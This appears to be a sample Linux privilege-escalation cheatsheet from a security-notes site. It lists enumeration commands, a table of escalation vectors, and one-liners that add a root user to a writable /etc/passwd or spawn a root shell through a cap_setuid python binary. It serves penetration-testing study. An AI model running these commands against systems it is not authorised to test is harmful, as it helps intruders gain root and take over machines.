---
title: "Linux Privilege Escalation — Cheatsheet"
description: "Fast enumeration checklist and common escalation paths for Linux post-exploitation."
pubDate: 2026-03-02
updatedDate: 2026-05-20
tags: ["linux", "privesc", "cheatsheet", "post-exploitation"]
topic: "Post-Exploitation"
draft: false
---

> Sample cheatsheet. Keep your own quick references under `src/content/notes/`.

## Quick Enumeration

```bash
# who am I, what can I do
id; sudo -l 2>/dev/null
# kernel + distro
uname -a; cat /etc/os-release
# SUID / SGID binaries
find / -perm -4000 -type f 2>/dev/null
# writable cron / world-writable in PATH dirs
ls -la /etc/cron* ; cat /etc/crontab
# automated
./linpeas.sh -a | tee linpeas.txt
```

## Common Escalation Paths

| Vector | Check | Exploit |
| --- | --- | --- |
| `sudo` misconfig | `sudo -l` | GTFOBins for the allowed binary |
| SUID binary | `find / -perm -4000` | GTFOBins SUID section |
| Writable `/etc/passwd` | `ls -l /etc/passwd` | add root user with known hash |
| Cron job (writable script) | `cat /etc/crontab` | inject payload into the script |
| Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid` → spawn root shell |
| Kernel exploit | `uname -r` | match to public PoC (last resort) |

## Handy One-Liners

```bash
# stabilize a shell
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm

# add a root user if /etc/passwd is writable
echo 'pwn:$1$x$g".../:0:0:root:/root:/bin/bash' >> /etc/passwd

# capability-based escalation (cap_setuid on python)
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## References

- GTFOBins — <https://gtfobins.github.io>
- PEASS-ng (linpeas) — <https://github.com/peass-ng/PEASS-ng>
